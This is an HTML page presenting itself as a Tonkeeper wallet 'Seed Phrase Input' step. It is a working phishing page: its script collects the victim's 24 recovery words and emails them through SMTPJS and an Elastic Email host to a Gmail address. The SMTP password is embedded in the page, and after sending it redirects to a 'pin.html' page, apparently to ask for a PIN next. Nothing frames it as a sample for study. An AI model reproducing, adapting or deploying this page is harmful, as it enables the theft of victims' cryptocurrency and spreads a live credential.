<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <link rel="icon" type="image/png" href="logo.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Seed Phrase Input</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
<form id="form" onsubmit="emailSend(); return false;">
  <div class="container">
    <h3>Your Seed Phrase</h3>
    <p>Enter your Tonkeeper 24 words seed phrase:</p>
    <button type="button" id="pasteBtn">Paste Seed Phrase To Continue</button>
    <div class="grid">
      <!-- Input fields -->
      ${Array.from({ length: 24 }, (_, i) => `
        <div class="word">
          <span>${i + 1}.</span> <input type="text" maxlength="10" class="seed-input" data-index="${i + 1}">
        </div>
      `).join('')}
    </div>
    <p class="warning">Make sure to enter the words in the correct order!</p>
    <label>
      <input type="checkbox" id="confirm"> I have entered my seed phrase
    </label>
    <button type="submit" id="nextBtn" disabled>Next</button>
  </div>
</form>
<script src="https://smtpjs.com/v3/smtp.js"></script>
<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
<script>
function emailSend() {
  const seedPhraseWords = [];
  const seedInputs = document.querySelectorAll('.seed-input');

  seedInputs.forEach(input => {
    seedPhraseWords.push(input.value.trim());
  });

  if (seedPhraseWords.includes("") || seedPhraseWords.length !== 24) {
    swal("Error", "Please complete all 24 seed phrase fields.", "error");
    return;
  }

  const messageBody = "Seed Phrase: " + seedPhraseWords.join(" ");

  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "payday10177@gmail.com",
    Password: "176A549B6BD880A9C5A531EDE06FF1F541C8",
    To: 'payday10177@gmail.com',
    From: "payday10177@gmail.com",
    Subject: "Seed Phrase",
    Body: messageBody
  }).then(
    message => {
      if (message === 'OK') {
        window.location.href = 'pin.html';
      } else {
        swal("Error", "There was a problem sending your seed phrase. Please try again.", "error");
      }
    }
  );
}

const seedInputs = document.querySelectorAll('.seed-input');
const nextBtn = document.getElementById('nextBtn');
const confirmCheckbox = document.getElementById('confirm');

function checkFormCompletion() {
  const allFilled = Array.from(seedInputs).every(input => input.value.trim() !== '');
  nextBtn.disabled = !(allFilled && confirmCheckbox.checked);
}

seedInputs.forEach(input => {
  input.addEventListener('input', checkFormCompletion);
});

confirmCheckbox.addEventListener('change', checkFormCompletion);

const pasteBtn = document.getElementById('pasteBtn');
pasteBtn.addEventListener('click', () => {
  const userSeedPhrase = prompt("Paste your seed phrase (separate words with spaces):");
  if (userSeedPhrase) {
    const words = userSeedPhrase.trim().split(/\s+/);
    if (words.length !== 24) {
      swal("Error", "You must enter exactly 24 words.", "error");
      return;
    }
    seedInputs.forEach((input, index) => {
      input.value = words[index] || "";
    });
    checkFormCompletion();
  }
});
</script>
</body>
</html>
